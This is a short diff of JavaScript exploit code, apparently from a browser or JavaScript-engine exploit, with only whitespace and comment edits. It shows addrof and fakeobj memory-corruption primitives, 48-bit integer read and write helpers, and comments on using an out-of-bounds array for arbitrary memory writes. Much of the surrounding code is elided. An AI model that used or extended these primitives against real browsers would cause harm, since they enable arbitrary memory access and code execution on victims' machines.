@@ -1,5 +1,6 @@
 //
 // ...
+
 function i48_put(x, a) {
   a[4] = x;              // lower 32 bits of <x>
   a[5] = x / 4294967296; // upper 32 bits of <x>
@@ -7,19 +8,22 @@ function i48_put(x, a) {
 
 //
 // ...
+
 function i48_get(a) {
   return a[4] + a[5] * 4294967296;
 }
 
 //
 // addrof primitive
+
 function addrof(x) {
   leaker_obj.a = x;
   return i48_get(leaker_arr);
 }
 
 //
-// fakeobj primitive 
+// fakeobj primitive
+
 function fakeobj(x) {
   i48_put(x, leaker_arr);
   return leaker_obj.a;
@@ -85,6 +89,7 @@ function read_mem_as_string(p, sz) {
   }
   return ans;
 }
+
 //
 // Writes the contents of (data) to the out-of-bounds
 // slave array (oob_slave), allowing arbitrary writing
@@ -121,8 +126,8 @@ function write_ptr_at(p, d) {
 }
 
 //
-// Converts a regular number to its 16-bit hexadecimal 
-// representation, before returning it.
+// Converts a number to its 16-bit hexadecimal representation, 
+// before returning it.
 
 function num_to_hex(num) {
   return Number(num).toString(16);
